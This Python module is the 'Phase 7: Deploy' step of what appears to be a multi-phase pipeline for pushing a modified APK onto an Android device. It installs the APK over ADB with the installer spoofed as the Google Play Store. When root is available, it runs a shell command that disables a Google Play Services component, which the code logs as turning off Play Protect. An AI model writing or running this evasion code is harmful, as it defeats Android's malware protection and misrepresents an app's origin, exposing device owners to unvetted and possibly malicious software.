"""Phase 7: Deploy — ADB install with Play Store spoof.

7.1 ADB push
7.2 Install with -i com.android.vending
7.3 Verify GMS check
"""
import os, subprocess
from config import ADB
from utils.logger import setup_logger
from utils.adb_helper import adb_install, adb_shell

logger = setup_logger()


def run(final_apk):
    """Phase 7: Deploy — ADB install.

    Args:
        final_apk: Path from Phase 6
    """
    logger.info("=" * 60)
    logger.info("[*] PHASE 7: Deploy")
    logger.info("=" * 60)

    try:
        # ADB install with Play Store spoof
        logger.info("[*] adb install -i com.android.vending ...")
        ok, out, err = adb_install(final_apk, spoof_store="com.android.vending", timeout=120)
        if ok:
            logger.info("[+] APK installed on device")
        else:
            logger.warning(f"[!] Install failed: {err}")

        # Verify
        result = adb_shell("pm list packages com.google.android.gms")
        logger.info(f"    GMS check: {result[:100]}")

        # If root, disable Play Protect
        result = adb_shell("su -c 'pm disable com.google.android.gms/.chimera.GmsIntentOperationService' 2>/dev/null || echo 'no_root'")
        if "no_root" not in result:
            logger.info("[+] Play Protect service disabled (root)")
    except Exception as e:
        logger.warning(f"[!] Phase 7 ADB skipped: {e}")

    logger.info("[+] Phase 7 Complete")
    return final_apk
